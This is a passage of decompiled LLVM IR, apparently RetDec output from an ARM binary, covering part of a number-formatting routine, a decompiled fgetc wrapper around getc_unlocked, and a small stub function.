  store i1 %v7_19b08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19b08, label %dec_label_pc_19b90, label %dec_label_pc_19b10

dec_label_pc_19b10:                               ; preds = %dec_label_pc_19b08
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19b14 = load i32, i32* %r0.global-to-local, align 4
  %v1_19b14 = icmp slt i32 %v0_19b14, 0
  %v2_19b14 = icmp eq i32 %v0_19b14, 0
  store i1 %v2_19b14, i1* %cpsr_z.global-to-local, align 1
  %v4_19b18 = select i1 %tmp275, i32 %v4_19834126130, i32 101
  store i32 %v4_19b18, i32* %r4.global-to-local, align 4
  store i32 0, i32* %stack_var_-47, align 4
  %v4_19b28 = sub i32 0, %v0_19b14
  %storemerge158 = select i1 %v1_19b14, i32 %v4_19b28, i32 %v0_19b14
  %tmp271 = ashr i32 %v0_19b14, 31
  %tmp272 = and i32 %tmp271, 2
  %tmp273 = add nuw nsw i32 %tmp272, 43
  store i32 %storemerge158, i32* %r5.global-to-local, align 4
  store i32 %tmp273, i32* %sl.global-to-local, align 4
  %v2_19b30 = ptrtoint i32* %stack_var_-47 to i32
  store i32 %v2_19b30, i32* %r6.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_19b38

dec_label_pc_19b38:                               ; preds = %dec_label_pc_19b68, %dec_label_pc_19b38, %dec_label_pc_19b10
  %v2_19b50 = phi i32 [ %v2_19b30, %dec_label_pc_19b10 ], [ %v6_19b50, %dec_label_pc_19b38 ], [ %v6_19b50, %dec_label_pc_19b68 ]
  %v0_19b48 = phi i32 [ %storemerge158, %dec_label_pc_19b10 ], [ %v2_19b54, %dec_label_pc_19b38 ], [ %v2_19b54, %dec_label_pc_19b68 ]
  %v3_19b40 = urem i32 %v0_19b48, 10
  %v1_19b44 = or i32 %v3_19b40, 48
  store i32 %v1_19b44, i32* %r3.global-to-local, align 4
  store i32 %v0_19b48, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_19b50 = trunc i32 %v1_19b44 to i8
  %v3_19b50 = add i32 %v2_19b50, -1
  %v4_19b50 = inttoptr i32 %v3_19b50 to i8*
  store i8 %v1_19b50, i8* %v4_19b50, align 1
  %v5_19b50 = load i32, i32* %r6.global-to-local, align 4
  %v6_19b50 = add i32 %v5_19b50, -1
  store i32 %v6_19b50, i32* %r6.global-to-local, align 4
  %v0_19b54 = load i32, i32* %r0.global-to-local, align 4
  %v1_19b54 = load i32, i32* %r1.global-to-local, align 4
  %v2_19b54 = sdiv i32 %v0_19b54, %v1_19b54
  store i32 %v2_19b54, i32* %r0.global-to-local, align 4
  %v0_19b58 = load i32, i32* %r8.global-to-local, align 4
  %v1_19b58 = add i32 %v0_19b58, 1
  store i32 %v1_19b58, i32* %r8.global-to-local, align 4
  %v7_19b5c = icmp eq i32 %v1_19b58, 3
  store i1 %v7_19b5c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_19b54, i32* %r5.global-to-local, align 4
  br i1 %v7_19b5c, label %dec_label_pc_19b38, label %dec_label_pc_19b68

dec_label_pc_19b68:                               ; preds = %dec_label_pc_19b38
  %v2_19b68 = icmp eq i32 %v2_19b54, 0
  store i1 %v2_19b68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19b68, label %dec_label_pc_19b70, label %dec_label_pc_19b38

dec_label_pc_19b70:                               ; preds = %dec_label_pc_19b68
  %v1_19b70 = add i32 %v5_19b50, -2
  store i32 %v1_19b70, i32* %r3.global-to-local, align 4
  %v0_19b74 = load i32, i32* %sl.global-to-local, align 4
  %v1_19b74 = trunc i32 %v0_19b74 to i8
  %v4_19b74 = inttoptr i32 %v1_19b70 to i8*
  store i8 %v1_19b74, i8* %v4_19b74, align 1
  %v0_19b78 = load i32, i32* %r3.global-to-local, align 4
  %v1_19b78 = add i32 %v0_19b78, -1
  store i32 %v1_19b78, i32* %r2.global-to-local, align 4
  %v0_19b7c = load i32, i32* %r4.global-to-local, align 4
  %v1_19b7c = trunc i32 %v0_19b7c to i8
  %v4_19b7c = inttoptr i32 %v1_19b78 to i8*
  store i8 %v1_19b7c, i8* %v4_19b7c, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_19b84 = load i32, i32* %r7.global-to-local, align 4
  %v1_19b84 = inttoptr i32 %v0_19b84 to i32*
  store i32 112, i32* %v1_19b84, align 4
  %v3_19b84 = add i32 %v0_19b84, 4
  %v4_19b84 = inttoptr i32 %v3_19b84 to i32*
  %v5_19b84 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v5_19b84, i32* %v4_19b84, align 4
  %v0_19b88 = load i32, i32* %r2.global-to-local, align 4
  %v1_19b88 = load i32, i32* %r7.global-to-local, align 4
  %v2_19b88 = add i32 %v1_19b88, 8
  %v3_19b88 = inttoptr i32 %v2_19b88 to i32*
  store i32 %v0_19b88, i32* %v3_19b88, align 4
  %v0_19b8c = load i32, i32* %r7.global-to-local, align 4
  %v1_19b8c = add i32 %v0_19b8c, 12
  store i32 %v1_19b8c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_19b90

dec_label_pc_19b90:                               ; preds = %dec_label_pc_19b08, %.thread124, %dec_label_pc_19b70
  %v1_19b9c.pre = phi i32 [ %v2_19668, %.thread124 ], [ %v1_19b8c, %dec_label_pc_19b70 ], [ %v1_19b9c.pre.pre, %dec_label_pc_19b08 ]
  %v2_19b90 = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_19b90, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19b94

dec_label_pc_19b94:                               ; preds = %dec_label_pc_19b94, %dec_label_pc_19b90
  %v0_19b94 = phi i32 [ %v2_19b90, %dec_label_pc_19b90 ], [ %v4_19b94, %dec_label_pc_19b94 ]
  %stack_var_-188.0 = phi i32 [ %v3_19504, %dec_label_pc_19b90 ], [ %v2_19ba0, %dec_label_pc_19b94 ]
  %v1_19b94 = inttoptr i32 %v0_19b94 to i32*
  %v2_19b94 = load i32, i32* %v1_19b94, align 4
  store i32 %v2_19b94, i32* %r3.global-to-local, align 4
  %v4_19b94 = add i32 %v0_19b94, 12
  store i32 %v4_19b94, i32* %r2.global-to-local, align 4
  %v3_19b9c = icmp ult i32 %v4_19b94, %v1_19b9c.pre
  %v2_19ba0 = sub i32 %stack_var_-188.0, %v2_19b94
  store i32 %v2_19ba0, i32* %ip.global-to-local, align 4
  br i1 %v3_19b9c, label %dec_label_pc_19b94, label %dec_label_pc_19bac

dec_label_pc_19bac:                               ; preds = %dec_label_pc_19b94
  %v3_19bac = load i8, i8* %stack_var_-46, align 1
  %v4_19bac = sext i8 %v3_19bac to i32
  store i32 %v4_19bac, i32* %r3.global-to-local, align 4
  store i32 %v4_19bac, i32* %r2.global-to-local, align 4
  %v2_19bb0 = icmp eq i8 %v3_19bac, 0
  store i1 %v2_19bb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19bb0, label %bb254, label %bb253

bb253:                                            ; preds = %dec_label_pc_19bac
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb254

bb254:                                            ; preds = %dec_label_pc_19bac, %bb253
  %v1_19c10 = phi i32 [ %v4_19bac, %dec_label_pc_19bac ], [ 1, %bb253 ]
  %v2_19bb8 = sub i32 %v2_19ba0, %v1_19c10
  store i32 %v2_19bb8, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_19bc0 = ptrtoint i8* %stack_var_-46 to i32
  store i32 %v2_19bc0, i32* %r3.global-to-local, align 4
  %v2_19bc4 = icmp eq i32 %v2_19bb8, 0
  store i1 %v2_19bc4, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-180, align 4
  %tmp255 = icmp slt i32 %v2_19bb8, 1
  br i1 %tmp255, label %dec_label_pc_19c2c, label %dec_label_pc_19bd8

dec_label_pc_19bd8:                               ; preds = %bb254
  %v3_19bd8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_19bd8, i32* %lr.global-to-local, align 4
  %v1_19bdc = add i32 %v3_19bd8, 12
  %v2_19bdc = inttoptr i32 %v1_19bdc to i32*
  %v3_19bdc = load i32, i32* %v2_19bdc, align 4
  store i32 %v3_19bdc, i32* %r3.global-to-local, align 4
  %v1_19be0 = and i32 %v3_19bdc, 8
  %v2_19be0 = icmp eq i32 %v1_19be0, 0
  store i1 %v2_19be0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19be0, label %dec_label_pc_19c04, label %dec_label_pc_19be8

dec_label_pc_19be8:                               ; preds = %dec_label_pc_19bd8
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33049), i32* %r3.global-to-local, align 4
  %v1_19bf8 = add i32 %v1_19b9c.pre, 12
  store i32 %v1_19bf8, i32* %r6.global-to-local, align 4
  %v1_19bfc = inttoptr i32 %v1_19b9c.pre to i32*
  store i32 160, i32* %v1_19bfc, align 4
  %v3_19bfc = add i32 %v1_19b9c.pre, 4
  %v4_19bfc = inttoptr i32 %v3_19bfc to i32*
  %v5_19bfc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_19bfc, i32* %v4_19bfc, align 4
  %v6_19bfc = add i32 %v1_19b9c.pre, 8
  %v7_19bfc = inttoptr i32 %v6_19bfc to i32*
  %v8_19bfc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_19bfc, i32* %v7_19bfc, align 4
  br label %dec_label_pc_19c30

dec_label_pc_19c04:                               ; preds = %dec_label_pc_19bd8
  store i32 %v3_19bd8, i32* %ip.global-to-local, align 4
  %v1_19c08 = add i32 %v3_19bd8, 16
  %v2_19c08 = inttoptr i32 %v1_19c08 to i32*
  %v3_19c08 = load i32, i32* %v2_19c08, align 4
  store i32 %v3_19c08, i32* %r3.global-to-local, align 4
  %v7_19c0c = icmp eq i32 %v3_19c08, 48
  store i1 %v7_19c0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19c0c, label %.thread54.thread70, label %bb256

bb256:                                            ; preds = %dec_label_pc_19c04
  store i32 %v2_19ba0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_19c2c

.thread54.thread70:                               ; preds = %dec_label_pc_19c04
  %v4_19c18 = load i32, i32* %stack_var_-164, align 4
  store i32 %v1_19b9c.pre, i32* %r6.global-to-local, align 4
  %v3_19c20 = add i32 %v4_19c18, %v2_19bb8
  store i32 %v3_19c20, i32* %r3.global-to-local, align 4
  store i32 %v3_19c20, i32* %stack_var_-164, align 4
  br label %dec_label_pc_19c30

dec_label_pc_19c2c:                               ; preds = %bb256, %bb254
  store i32 %v1_19b9c.pre, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_19c30

dec_label_pc_19c30:                               ; preds = %.thread54.thread70, %dec_label_pc_19be8, %dec_label_pc_19c2c
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_19c34 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_19c34, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19c38

dec_label_pc_19c38:                               ; preds = %dec_label_pc_19c60, %dec_label_pc_19c30
  %v0_19c38 = phi i32 [ %v1_19c54, %dec_label_pc_19c60 ], [ %v2_19c34, %dec_label_pc_19c30 ]
  %v1_19c38 = inttoptr i32 %v0_19c38 to i32*
  %v2_19c38 = load i32, i32* %v1_19c38, align 4
  store i32 %v2_19c38, i32* %r1.global-to-local, align 4
  %v3_19c38 = add i32 %v0_19c38, 4
  %v4_19c38 = inttoptr i32 %v3_19c38 to i32*
  %v5_19c38 = load i32, i32* %v4_19c38, align 4
  store i32 %v5_19c38, i32* %r2.global-to-local, align 4
  %v6_19c38 = add i32 %v0_19c38, 8
  %v7_19c38 = inttoptr i32 %v6_19c38 to i32*
  %v8_19c38 = load i32, i32* %v7_19c38, align 4
  store i32 %v8_19c38, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* @ip, align 4
  store i32 105548, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_19c4c = load i32, i32* %r5.global-to-local, align 4
  %v1_19c4c = add i32 %v0_19c4c, 4
  %v2_19c4c = inttoptr i32 %v1_19c4c to i32*
  %v3_19c4c = load i32, i32* %v2_19c4c, align 4
  store i32 %v3_19c4c, i32* %r3.global-to-local, align 4
  %v0_19c50 = load i32, i32* %r0.global-to-local, align 4
  %v9_19c50 = icmp eq i32 %v0_19c50, %v3_19c4c
  store i1 %v9_19c50, i1* %cpsr_z.global-to-local, align 1
  %v1_19c54 = add i32 %v0_19c4c, 12
  store i32 %v1_19c54, i32* %r5.global-to-local, align 4
  br i1 %v9_19c50, label %dec_label_pc_19c60, label %bb257

bb257:                                            ; preds = %dec_label_pc_19c38
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_19c80

dec_label_pc_19c60:                               ; preds = %dec_label_pc_19c38
  %v0_19c64.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_19c60 = load i32, i32* %r6.global-to-local, align 4
  %v3_19c60 = icmp ult i32 %v1_19c54, %v1_19c60
  %v9_19c60 = icmp eq i32 %v1_19c54, %v1_19c60
  store i1 %v9_19c60, i1* %cpsr_z.global-to-local, align 1
  %v2_19c64 = add i32 %v0_19c64.pre, %v3_19c4c
  store i32 %v2_19c64, i32* %r7.global-to-local, align 4
  br i1 %v3_19c60, label %dec_label_pc_19c38, label %dec_label_pc_19c80

dec_label_pc_19c78:                               ; preds = %.thread21, %bb239
  %v0_19c78 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_19c78, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_19978

dec_label_pc_19c80:                               ; preds = %dec_label_pc_19c60, %bb257
  %v0_19c80 = phi i32 [ -1, %bb257 ], [ %v2_19c64, %dec_label_pc_19c60 ]
  store i32 %v0_19c80, i32* %r0.global-to-local, align 4
  store i32 %v27_194bc, i32* @lr, align 4
  ret i32 %v0_19c80

; uselistorder directives
  uselistorder i32 %v0_19c80, { 1, 0 }
  uselistorder i32 %v1_19c60, { 1, 0 }
  uselistorder i32 %v1_19c54, { 0, 1, 3, 2 }
  uselistorder i32 %v0_19c38, { 2, 1, 0 }
  uselistorder i32 %v3_19bd8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_19ba0, { 0, 1, 3, 2 }
  uselistorder i32 %v4_19b94, { 1, 2, 0 }
  uselistorder i32 %v0_19b94, { 1, 0 }
  uselistorder i32 %v1_19b9c.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_19b54, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v6_19b50, { 2, 1, 0 }
  uselistorder i32 %storemerge158, { 1, 0 }
  uselistorder i32 %v0_19b14, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_19adc, { 1, 0 }
  uselistorder i32 %v1_19adc, { 1, 2, 0, 3 }
  uselistorder i32 %v2_19ad8, { 2, 4, 0, 1, 3, 5 }
  uselistorder i1 %v2_19a38, { 2, 1, 0 }
  uselistorder i32 %v2_199b8, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_199a8, { 1, 2, 3, 5, 0, 4, 6 }
  uselistorder i1 %v2_19994, { 1, 0, 2 }
  uselistorder i32 %v5_19990, { 0, 2, 1, 3 }
  uselistorder i32 %v1_19a2030, { 3, 0, 4, 6, 1, 2, 5, 7, 8, 9 }
  uselistorder i1 %v2_19948, { 1, 0 }
  uselistorder i32 %v1_19940, { 1, 2, 0 }
  uselistorder i32 %v2_19934, { 1, 0 }
  uselistorder i32 %v1_19934, { 1, 2, 0, 3 }
  uselistorder i32 %v0_19934, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i1 %v3_19904, { 1, 0 }
  uselistorder i32 %v0_19904, { 0, 2, 1 }
  uselistorder i32 %v2_19900, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v1_198ec, { 1, 0 }
  uselistorder i1 %v2_198dc, { 1, 0 }
  uselistorder i32 %v1_198d8, { 3, 2, 1, 0 }
  uselistorder i32 %v2_198d4, { 1, 0 }
  uselistorder i1 %v2_198c4, { 1, 0 }
  uselistorder i32 %v1_198b8, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_1986c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1986c, { 1, 0, 2 }
  uselistorder i1 %v2_19854, { 1, 0 }
  uselistorder i32 %v5_1983c, { 1, 0 }
  uselistorder i32 %v0_19828, { 1, 2, 0, 3 }
  uselistorder i32 %v0_19810, { 1, 2, 0 }
  uselistorder i32 %v2_1980c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_197a4, { 2, 4, 1, 0, 3 }
  uselistorder i32 %stack_var_-192.4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1974c, { 1, 0 }
  uselistorder double %v2_19710, { 1, 0 }
  uselistorder i32 %v0_196cc, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v3_196c0, { 1, 0 }
  uselistorder i32 %v2_196fc, { 1, 3, 0, 2 }
  uselistorder i32 %v0_19690, { 1, 0 }
  uselistorder i32 %v5_1964c, { 1, 0 }
  uselistorder i32 %v1_1956c.v0_195585, { 1, 0 }
  uselistorder i32 %v3_19628, { 1, 0 }
  uselistorder i32 %v0_19604, { 0, 2, 3, 1 }
  uselistorder i32 %v2_195ec, { 2, 1, 0 }
  uselistorder i32 %v0_195d0, { 1, 0 }
  uselistorder i32 %v0_194f0, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-83, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-82, { 1, 2, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-47, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-46, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_0, { 2, 3, 0, 1 }
  uselistorder i32 %tmp160, { 1, 0, 2, 3 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 4, 5, 6, 0, 7, 8, 1, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 12, 11, 13 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 13, 14, 15, 5, 16, 17, 6, 18, 19, 20, 7, 21, 22, 8, 23, 24, 9, 10, 11, 12, 25, 26, 27, 28, 30, 29, 31, 32 }
  uselistorder i32* %r6.global-to-local, { 3, 2, 1, 4, 5, 6, 7, 8, 0, 9, 10, 13, 14, 15, 11, 16, 17, 12, 18, 21, 19, 20, 22 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 9, 7, 10, 11, 8, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 18, 19, 21, 22, 23, 24, 25, 26, 27, 29, 43, 30, 34, 31, 32, 33, 35, 28, 36, 37, 38, 39, 40, 41, 42, 64, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 2, 65, 66, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 18, 15, 19, 20, 16, 17, 21, 22, 23, 26, 24, 25, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 12, 15, 16, 13, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 8, 38, 9, 10, 16, 20, 19, 17, 11, 12, 18, 13, 14, 4, 21, 15, 3, 22, 23, 2, 1, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 36, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 19, 20, 21, 22, 23, 24, 25, 26, 61, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 60, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59 }
  uselistorder i32 112, { 2, 11, 0, 12, 3, 1, 13, 4, 6, 5, 7, 8, 9, 10, 14 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5, 6 }
  uselistorder i32 57, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmpge, { 1, 0 }
  uselistorder i32 1104006501, { 4, 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33028), { 0, 2, 1 }
  uselistorder i32 1100470148, { 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33052), { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmplt, { 3, 2, 1, 0 }
  uselistorder double 0.000000e+00, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__aeabi_dcmpeq, { 2, 1, 0 }
  uselistorder i8 32, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 0, 1, 2, 6, 5, 4, 3, 8, 7, 9 }
  uselistorder label %dec_label_pc_19c78, { 1, 0 }
  uselistorder label %dec_label_pc_19c30, { 2, 0, 1 }
  uselistorder label %bb254, { 1, 0 }
  uselistorder label %dec_label_pc_19b90, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19b08, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19ad8, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %dec_label_pc_19ab0, { 1, 0 }
  uselistorder label %dec_label_pc_19a84, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19a60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19a30, { 2, 1, 0 }
  uselistorder label %.thread34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19978, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_19968, { 1, 0 }
  uselistorder label %bb236, { 1, 0 }
  uselistorder label %bb234, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %.thread145, { 1, 0 }
  uselistorder label %._crit_edge93, { 1, 0 }
  uselistorder label %bb228, { 1, 0 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb223, { 1, 0 }
  uselistorder label %dec_label_pc_19890, { 2, 1, 0 }
  uselistorder label %bb220, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1979c, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1974c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19744, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %dec_label_pc_19628, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_19544, { 1, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %bb201, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_19cb0 = load i32, i32* @r4, align 4
  store i32 %v3_19cb0, i32* %stack_var_-16, align 4
  %v6_19cb0 = load i32, i32* @r5, align 4
  %v12_19cb0 = load i32, i32* @lr, align 4
  %v1_19cb4 = add i32 %arg1, 52
  %v2_19cb4 = inttoptr i32 %v1_19cb4 to i32*
  %v3_19cb4 = load i32, i32* %v2_19cb4, align 4
  %v2_19cbc = icmp eq i32 %v3_19cb4, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r6.global-to-local, align 4
  br i1 %v2_19cbc, label %dec_label_pc_19cf4, label %dec_label_pc_19cd0

dec_label_pc_19cd0:                               ; preds = %entry
  %v1_19cd0 = add i32 %arg1, 16
  %v2_19cd0 = inttoptr i32 %v1_19cd0 to i32*
  %v3_19cd0 = load i32, i32* %v2_19cd0, align 4
  %v1_19cd4 = add i32 %arg1, 24
  %v2_19cd4 = inttoptr i32 %v1_19cd4 to i32*
  %v3_19cd4 = load i32, i32* %v2_19cd4, align 4
  %v3_19cd8 = icmp ult i32 %v3_19cd0, %v3_19cd4
  br i1 %v3_19cd8, label %.thread, label %dec_label_pc_19ce8

.thread:                                          ; preds = %dec_label_pc_19cd0
  %v2_19cdc = inttoptr i32 %v3_19cd0 to i8*
  %v3_19cdc = load i8, i8* %v2_19cdc, align 1
  %v4_19cdc = zext i8 %v3_19cdc to i32
  store i32 %v4_19cdc, i32* %r4.global-to-local, align 4
  %v6_19cdc = add i32 %v3_19cd0, 1
  store i32 %v6_19cdc, i32* %v2_19cd0, align 4
  br label %dec_label_pc_19d68

dec_label_pc_19ce8:                               ; preds = %dec_label_pc_19cd0
  %v1_19ce8 = inttoptr i32 %arg1 to i16*
  %v2_19ce8 = call i32 @getc_unlocked(i16* %v1_19ce8)
  store i32 %v2_19ce8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19d68

dec_label_pc_19cf4:                               ; preds = %entry
  %v1_19cf8 = add i32 %arg1, 56
  store i32 %v1_19cf8, i32* @r4, align 4
  %v4_19d0c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_19d0c)
  %v0_19d20 = load i32, i32* %r6.global-to-local, align 4
  %v2_19d20 = add i32 %v0_19d20, 16
  %v3_19d20 = inttoptr i32 %v2_19d20 to i32*
  %v4_19d20 = load i32, i32* %v3_19d20, align 4
  store i32 105772, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_19d20)
  %v0_19d2c = load i32, i32* @r5, align 4
  %v1_19d2c = add i32 %v0_19d2c, 16
  %v2_19d2c = inttoptr i32 %v1_19d2c to i32*
  %v3_19d2c = load i32, i32* %v2_19d2c, align 4
  %v1_19d30 = add i32 %v0_19d2c, 24
  %v2_19d30 = inttoptr i32 %v1_19d30 to i32*
  %v3_19d30 = load i32, i32* %v2_19d30, align 4
  %v3_19d34 = icmp ult i32 %v3_19d2c, %v3_19d30
  br i1 %v3_19d34, label %.thread2, label %dec_label_pc_19d44

.thread2:                                         ; preds = %dec_label_pc_19cf4
  %v2_19d38 = inttoptr i32 %v3_19d2c to i8*
  %v3_19d38 = load i8, i8* %v2_19d38, align 1
  %v4_19d38 = zext i8 %v3_19d38 to i32
  store i32 %v4_19d38, i32* %r4.global-to-local, align 4
  %v6_19d38 = add i32 %v3_19d2c, 1
  store i32 %v6_19d38, i32* %v2_19d2c, align 4
  br label %dec_label_pc_19d50

dec_label_pc_19d44:                               ; preds = %dec_label_pc_19cf4
  %v1_19d48 = inttoptr i32 %v0_19d2c to i16*
  %v2_19d48 = call i32 @getc_unlocked(i16* %v1_19d48)
  store i32 %v2_19d48, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19d50

dec_label_pc_19d50:                               ; preds = %.thread2, %dec_label_pc_19d44
  %v0_19d5c = load i32, i32* %r6.global-to-local, align 4
  %v2_19d5c = add i32 %v0_19d5c, 24
  %v3_19d5c = inttoptr i32 %v2_19d5c to i32*
  %v4_19d5c = load i32, i32* %v3_19d5c, align 4
  store i32 %v4_19d5c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_19d5c)
  br label %dec_label_pc_19d68

dec_label_pc_19d68:                               ; preds = %.thread, %dec_label_pc_19ce8, %dec_label_pc_19d50
  %v0_19d68 = load i32, i32* %r4.global-to-local, align 4
  %v2_19d70 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19d70, i32* @r4, align 4
  store i32 %v6_19cb0, i32* @r5, align 4
  store i32 %v12_19cb0, i32* @lr, align 4
  ret i32 %v0_19d68

; uselistorder directives
  uselistorder i32 %v3_19d2c, { 1, 0, 2 }
  uselistorder i32 %v3_19cd0, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 4, 5, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_19d68, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19d50, { 1, 0 }
}

define i32 @function_19d7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_19d7c:
  %v0_19d7c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19d7c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_19d7c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_19d7c, %bb
  %v10_19d88 = phi i32 [ %arg1, %dec_label_pc_19d7c ], [ 0, %bb ]
  ret i32 %v10_19d88

; uselistorder directives
